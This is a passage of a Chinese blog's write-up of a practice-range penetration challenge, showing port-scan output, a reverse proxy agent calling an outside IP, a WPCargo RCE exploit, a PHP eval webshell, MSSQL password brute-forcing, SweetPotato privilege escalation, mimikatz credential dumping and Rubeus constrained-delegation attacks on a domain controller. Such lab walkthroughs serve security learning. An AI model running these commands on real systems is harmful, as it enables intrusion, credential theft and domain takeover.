class="line"><span class="string">172.22.2.7:22 open</span></span><br><span class="line"><span class="string">172.22.2.7:21 open</span></span><br><span class="line"><span class="string">172.22.2.3:88 open</span></span><br><span class="line"><span class="string">172.22.2.34:139 open</span></span><br><span class="line"><span class="string">172.22.2.16:135 open</span></span><br><span class="line"><span class="string">172.22.2.34:135 open</span></span><br><span class="line"><span class="string">172.22.2.3:135 open</span></span><br><span class="line"><span class="string">172.22.2.16:80 open</span></span><br><span class="line"><span class="string">172.22.2.18:80 open</span></span><br><span class="line"><span class="string">172.22.2.18:22 open</span></span><br><span class="line"><span class="string">172.22.2.7:6379 open</span></span><br><span class="line"><span class="string">172.22.2.16:1433 open</span></span><br><span class="line"><span class="string">172.22.2.16:445 open</span></span><br><span class="line"><span class="string">172.22.2.18:445 open</span></span><br><span class="line"><span class="string">172.22.2.3:445 open</span></span><br><span class="line"><span class="string">172.22.2.34:445 open</span></span><br><span class="line"><span class="string">172.22.2.16:139 open</span></span><br><span class="line"><span class="string">172.22.2.18:139 open</span></span><br><span class="line"><span class="string">172.22.2.3:139 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 20</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.2.3</span></span><br><span class="line"><span class="string">   [-&gt;]DC</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.2.3</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.2.16</span></span><br><span class="line"><span class="string">   [-&gt;]MSSQLSERVER</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.2.16</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.2.34</span></span><br><span class="line"><span class="string">   [-&gt;]CLIENT01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.2.34</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[+] ftp 172.22.2.7:21:anonymous </span></span><br><span class="line"><span class="string">   [-&gt;]pub</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span></span><br><span class="line"><span class="string">已完成 20/20</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 12.83299473s</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>172.22.2.7 已拿下</li>
+<li>172.22.2.34   XIAORANG\CLIENT01</li>
+<li>172.22.2.16   MSSQLSERVER.xiaorang.lab</li>
+<li>172.22.2.3     DC:DC.xiaorang.lab</li>
+<li>172.22.2.18   WORKGROUP\UBUNTU-WEB02</li>
+</ul>
+<p>然后我们搭建代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 2334 -s 123</span><br><span class="line"></span><br><span class="line">./linux_x64_agent -c 124.223.25.186:2334 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">use 0</span><br><span class="line">socks 3333</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p>Windows用proxifier连接代理</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><h3 id="WordPress插件nday"><a href="#WordPress插件nday" class="headerlink" title="WordPress插件nday"></a>WordPress插件nday</h3><p>访问<code>http://172.22.2.18</code>是一个WordPress站点</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110546282.png" alt="image-20251106110546282"></p>
+<p>用wpscan扫一下</p>
+<p><strong>WPScan</strong> 是一款专门用于检测 <strong>WordPress</strong> 网站安全问题的命令行工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wpscan --update</span><br><span class="line"></span><br><span class="line">proxychains4 wpscan --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">proxychains4 wpscan --url http://172.22.2.18/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110728079.png" alt="image-20251106110728079"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110859853.png" alt="image-20251106110859853"></p>
+<p>发现WPCargo插件是6.x.x版本，存在一个nday的RCE <a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">E:\脚本和字典\poc库\CVE-2021-25003\CVE-2021-25003-main&gt;python WpCargo.py --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># @author : biulove0x                      #</span></span><br><span class="line"><span class="comment"># @name   : WP Plugins WPCargo Exploiter   #</span></span><br><span class="line"><span class="comment"># @cve    : CVE-2021-25003                 #</span></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">usage: WpCargo.py [-h] [-t example.com] [-l target.txt]</span><br><span class="line"></span><br><span class="line">CVE-2021-25003 [ WPCargo &lt; 6.9.0 - Unauthenticated RCE ]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>      show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -t example.com  Single target</span><br><span class="line">  -l target.txt   Multiple target</span><br></pre></td></tr></table></figure>
+
+<p>传<code>-t</code>参数就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">E:\脚本和字典\poc库\CVE-2021-25003\CVE-2021-25003-main&gt;python WpCargo.py -t http://172.22.2.18/</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># @author : biulove0x                      #</span></span><br><span class="line"><span class="comment"># @name   : WP Plugins WPCargo Exploiter   #</span></span><br><span class="line"><span class="comment"># @cve    : CVE-2021-25003                 #</span></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!</span><br></pre></td></tr></table></figure>
+
+<p>访问一下<code>http://172.22.2.18/wp-content/wp-conf.php</code></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111158674.png" alt="image-20251106111158674"></p>
+<p>那写个木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=system</span><br><span class="line">2=<span class="built_in">echo</span> <span class="string">&quot;&lt;?php+@eval(\$_POST[1]);?&gt;&quot;</span> &gt; /var/www/html/a.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111656163.png" alt="image-20251106111656163"></p>
+<p>写了之后用蚁剑连一下</p>
+<p>在 <code>wp-config.php</code>中找到配置文件中有数据库账号密码</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111820721.png" alt="image-20251106111820721"></p>
+<p>数据操作中连一下</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111925866.png" alt="image-20251106111925866"></p>
+<p>看到一个flaagggghere库中有flag02</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106112004833.png" alt="image-20251106112004833"></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>然后S0meth1ng_y0u_m1ght_1ntereSted里面还有一个密码表</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106112412806.png" alt="image-20251106112412806"></p>
+<p>导出为txt，然后用密码爆破172.22.2.16  ，因为他是mssql服务器，常用端口是1433</p>
+<h3 id="弱口令爆破mssql密码"><a href="#弱口令爆破mssql密码" class="headerlink" title="弱口令爆破mssql密码"></a>弱口令爆破mssql密码</h3><p><a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a> 用工具进行爆破</p>
+<p>记得给这个app配置一下代理，不然一直打不通</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115250786.png" alt="image-20251106115250786"></p>
+<p>也可以用fscan去爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\fscan.exe -h 172.22.2.16 -m mssql -pwdf 1.txt</span><br><span class="line">[+] mssql:172.22.2.16:1433:sa ElGNkOiC</span><br></pre></td></tr></table></figure>
+
+<p>然后用MDUT连接，激活一下组件传命令试试</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115446178.png" alt="image-20251106115446178"></p>
+<p>很明显权限是不够的，传个甜土豆提权</p>
+<h3 id="甜土豆提权"><a href="#甜土豆提权" class="headerlink" title="甜土豆提权"></a>甜土豆提权</h3><p>传个甜土豆提权后执行命令</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115620216.png" alt="image-20251106115620216"></p>
+<h3 id="添加新用户并RDP"><a href="#添加新用户并RDP" class="headerlink" title="添加新用户并RDP"></a>添加新用户并RDP</h3><p>查看端口开放情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/SweetPotato.exe -a <span class="string">&quot;netstat -ano&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现3389端口开放，那我们创建一个用户RDP上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/SweetPotato.exe -a <span class="string">&quot;net user test1 whoami666! /add&quot;</span></span><br><span class="line">C:/迅雷下载/SweetPotato.exe -a <span class="string">&quot;net localgroup administrators test1 /add&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在管理员目录拿到flag3</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120039063.png" alt="image-20251106120039063"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8&quot;&quot;&quot;&quot;8                           88     8&quot;&quot;&quot;8                    </span><br><span class="line">8    8   eeeee  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee </span><br><span class="line">8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8 </span><br><span class="line">88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8 </span><br><span class="line">88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8 </span><br><span class="line">88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag03: flag&#123;06862f4f-d82a-4a12-8fcd-81aefb716fa2&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>systeminfo命令用来显示计算机的详细配置信息</p>
+<p>查看systeminfo发现我们在域环境里面</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120253686.png" alt="image-20251106120253686"></p>
+<h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>传个猕猴桃mimikatz.exe上去并用管理员身份运行</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310%E6%95%99%E7%A8%8B">https://blog.csdn.net/weixin_40412037/article/details/113348310教程</a></p>
+<p>Mimikatz<code>（中文俗称“猕猴桃”）</code>是一款著名的 Windows 安全测试工具，主要用于 提取 Windows 系统中的敏感凭据（如明文密码、NTLM Hash、Kerberos 票据等）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提升权限 命令：privilege::debug</span><br><span class="line">提取登录凭据 命令 sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>然后慢慢翻</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120746197.png" alt="image-20251106120746197"></p>
+<p>约束委派攻击：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>
+<p>看到一个<code>MSSQLSERVER$</code>用户，MSSQLSERVER 配置了到域控的约束委派，可以通过 S4U 伪造高权限 ST 拿下域控，这里只有他的NTLM哈希可用，我们用Rubeus申请访问自身的服务票据，先把哈希保存下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">87ea4bffea233483d05f71b897ff2ded</span><br></pre></td></tr></table></figure>
+
+<p>约束性委派攻击的关键就是<strong>获得可转发的服务票据ST</strong></p>
+<p>获取根据约束性委派的执行过程可知，只要<strong>控制配置约束性委派服务的机器，并获得了它的密码</strong>，那么我们就可以劫持这台主机的</p>
+<p>kerberos请求过程，最终获得任意用户权限的ticket</p>
+<p>利用条件：</p>
+<ol>
+<li>需要Administrator权限</li>
+<li>目标机器账户配置了约束性委派</li>
+</ol>
+<p>用Rubeus申请访问自身的服务票据</p>
+<p><strong>Rubeus</strong> 是一个由安全研究者 Harmj0y（来自 GhostPack 团队）开发的 <strong>Windows Kerberos 攻击与测试工具</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:1400900feabf5d233a9c1ec534105274 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>rc4：使用 RC4-HMAC认证（即 NTLM 哈希）</li>
+</ul>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106122646317.png" alt="image-20251106122646317"></p>
+<p>拿到ticket凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE04fMkU+JaVJH2a0E7c8aoAYZXUEIr5fz8lAeFwBIhm4gtUGEqLr97ugt2NReOWLo44IRvWL2r5JMs3Tc1JFN/QSTima+yv4By1J+DJbQk+mfobr95e0jaCUDY6rjsbynEEscDMW6DxNHmF4ZxaOUxBIykTFe+i9E+UxA64K39krC3gLV0R6yNk50WoTjFnWjhGZz5YwxLYimiK2LRfnA8XkyWIBE4yLdZ+gaSzPvgnubJYKtxBxY9KbM2uAfl6bI+d/2mpRDVLRgYdRz4mudhXsFevYNmiwkODb9dU1SaO2pET8zwLWCymNSz9/WbiSBb0Nu9GSaYaFBIH9bUmca3pu8Ko213quEotgSZ5lGeJkogM8dk03ucsw9XH7a5lsuLUdHRYIG6VyZ1GH1s9zR1KanRrmoyxZCI/oNG6+FjToFWE+Cw4xDmfWbFBEcrxcDNwQIlwZ2CVfNcWfQvRFbtSPF8BsQYKyxRYQNfP1i4qdmFOh9IWt6RtnsuY7mGxQooaq+CtC6QvSJPGGwVfpVNCl1nNrb8o9UtNJAWBAFRrioIttm/AOcinGtXu8bB/S90/9gxVuz59jL6Az/aftbijCb0gS47RbphmtlxqJsHh/HDeGW7sxZIq8mLHv3E4d5OEQC4uhlIK3OACmAPfyglcZN536fWW3VprnBP8+izsmPUtFlxTv5toIQbKVCZAW2pfqRoviGBklexB0FHY2DgiYCG7B3s91z4armKJjcNDCXGSgTlTIkPzhYNE5bN6uDCe4tCk0XuUzpJ2RuuQj/NKEealwUHtyogq1Q1tsnnRTYkbcaBnp8knQkJvu2fCmIONEIaGPvboDFfsGlUQATJnJJJzlFoSn0WWUhuvO7v+fEkRKxoQ1ZVHHD/0tWe44QUvVqk4HDaLhv0MIEDJp7dXdyxkxRGDEY5qBzWnn/3KZBcoggxZp0xjrPWzQj8TBqZoVKMiWjKxwOMkxkyNeTNkpImBdGy8vV99NCL+RkGCEU7SIBWyE6hR2sjq7NhVKn4GQh2A7tjpOe+1pNF5//DX0fbV6Mx5pr6vp1dEwDuDQildwHGn6JJ/d7Z1ZQJSz/938iMIBVceuh8NIhObRFCv4YmJ5NFqBNOtulBbMbFLnrPJHf+kM1BLVzXYgquIVKbXc7G6tAIXFt3m6VFBH5V9O5IfAIp+qjHVorPZyOoFUx5LYc/wHuer2X7F6xL9ic8M5Iebv7x5YhBboJpZma+ZRQDSc1E8oLyW3mKzd3vB5t+sgdmS1wJMHzhvBw4UoOpClHtIUiP8G2JW4lQnBdjP/T9vfe8p02fxM7y+5+XED5wpabT1LIPNXb4Q8tkH8W5FISiMToDN6s2ESu8g0hk/4qonMZD0Q+ND/WaQxkhJu2uCZTEXa+vnh72WXXM6v4CDCl+Mi21Ppu90bmjns0/lAutKMDtrsFUIzwrbw2SXs9Ww8LRGnFaX6pEejlyjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBABy82O7WOHIrl6obfPSQ8BoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MTEwNjA0MjYzNFqmERgPMjAyNTExMDYxNDI2MzRapxEYDzIwMjUxMTEzMDQyNjM0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure>
+
+<p>然后利用票据打委派攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:上面抓到的服务票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106123330607.png" alt="image-20251106123330607"></p>
+<p>然后直接读flag就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106123451948.png" alt="image-20251106123451948"></p>
+<p>关于利用机器哈希值结合Rubeus的约束委派攻击可以参考</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106124218455.png" alt="image-20251106124218455"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-number">2.1.</span> <span class="toc-text">redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E6%8F%92%E4%BB%B6nday"><span class="toc-number">4.1.</span> <span class="toc-text">WordPress插件nday</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4mssql%E5%AF%86%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">弱口令爆破mssql密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9C%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">甜土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E5%B9%B6RDP"><span class="toc-number">5.3.</span> <span class="toc-text">添加新用户并RDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.</span> <span class="toc-text">约束委派攻击</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&text=春秋云镜BruteRoad"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&is_video=false&description=春秋云镜BruteRoad"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜BruteRoad&body=Check out this article: https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&name=春秋云镜BruteRoad&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&t=春秋云镜BruteRoad"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
